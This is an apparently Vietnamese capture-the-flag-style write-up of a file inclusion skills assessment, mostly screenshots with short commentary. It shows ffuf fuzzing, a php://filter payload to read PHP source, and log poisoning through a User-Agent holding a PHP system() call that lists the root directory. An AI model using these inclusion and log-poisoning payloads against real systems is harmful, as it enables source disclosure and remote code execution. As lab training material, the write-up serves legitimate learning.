<h1>Skills Assessment - File Inclusion</h1>

![image](https://github.com/user-attachments/assets/14eee696-d64a-461a-9fd9-29afd43df63a)

![image](https://github.com/user-attachments/assets/199869bf-9d80-4174-a5d5-3d385f0b0640)

Đây là giao diện web:

![image](https://github.com/user-attachments/assets/43c2c785-c190-4d1e-b762-5e6c1ac518e8)

Khi tôi ấn vào about us hay industries hay contact gì đó thì ở url, parameter page nhận giá trị:

![image](https://github.com/user-attachments/assets/61cc0a4f-8bd2-47e9-bca1-752a95e085ae)

Dùng ` ffuf -w burp-parameter-names.txt:FUZZ -u 'http://83.136.248.110:34073/index.php?FUZZ=value' | grep -v "Size: 15829"` thì có vẻ hết tham số rồi, có mỗi page thôi

![image](https://github.com/user-attachments/assets/accf8e55-5615-4d53-baa9-9147379acc42)

Sau khi ngồi nghịch cái tham số 1 lúc thì thấy nếu có ../ là hiện Invalid input detected! còn không thì không hiện:

![image](https://github.com/user-attachments/assets/2e107f8f-e222-452d-82a6-798c7aaa0bb0)

![image](https://github.com/user-attachments/assets/64174f05-7c8a-4588-9b90-748490625bf7)

Tôi thử dùng `page=php://filter/read=convert.base64-encode/resource=index` thì xuất hiện đoạn base64

![image](https://github.com/user-attachments/assets/570502ce-6642-4a67-99e5-55eaba19b2b6)

Dùng crtl+u để xem full:

![image](https://github.com/user-attachments/assets/065703f7-9517-40c6-9b77-091824525886)

Chuẩn code index.php rồi, ngon

![image](https://github.com/user-attachments/assets/15ab2870-b6e9-4e08-835f-2b1187371f63)

Ở chỗ contact có chỗ dành cho user input này

![image](https://github.com/user-attachments/assets/b051a8c8-7ee1-4794-96df-8991acb014c8)

Bỏ contact

![image](https://github.com/user-attachments/assets/ff78283c-cb66-4c6d-8c70-9f87521d9b51)

Đọc code tôi thấy kiểu gì cũng chạy main, nếu có .. thì chạy error.php, nó thậm chí còn chơi kiểu thêm .php ở sau mới khó

![image](https://github.com/user-attachments/assets/58f31886-66d2-412b-9610-c6a95b08c4c5)

error.php chỉ mỗi thế này

![image](https://github.com/user-attachments/assets/ed9c8766-06ad-4b35-9ffb-ef35eab4867a)

Sau 1 lúc thì tôi thấy làm sao để list hết các file .php?, dùng fuzz thôi `ffuf -w directory-list-2.3-medium.txt:FUZZ -u 'http://83.136.248.110:34073/FUZZ.php' | grep -v 'Size: 15829'`, fuzz xong cũng chả có gì ngoài mấy cái index contact kia:((.
Tôi đi đọc lại index thì thấy dòng comment:

![image](https://github.com/user-attachments/assets/c0440cf4-252a-4b0c-8bd0-a13ed79741e9)

Truy cập vào thì nó là chỗ xem log và có cả tham số log

![image](https://github.com/user-attachments/assets/1664ce8b-c9f6-4e7c-ae59-4d5d25c41e69)

![image](https://github.com/user-attachments/assets/55e9733a-9226-4024-8335-2cc91b27792a)

Và nó không hề có filter:

![image](https://github.com/user-attachments/assets/28b436ee-2566-44e8-a677-c1f031774c4a)

Thử với nginx thì ra được acccess.log:

![image](https://github.com/user-attachments/assets/0c3bf9f8-44cb-4607-b68f-6e9c0a74344b)

Đổi User-Agent: `<?php system('ls /'); ?>` để chạy ls:

![image](https://github.com/user-attachments/assets/47249b84-8db7-4a95-a5fa-44f0276b4036)

![image](https://github.com/user-attachments/assets/5c1b5e1a-e083-43bd-adab-9191a8f762ed)

Và xong:

![image](https://github.com/user-attachments/assets/bb4cc168-24e6-4185-8045-31614bb58966)







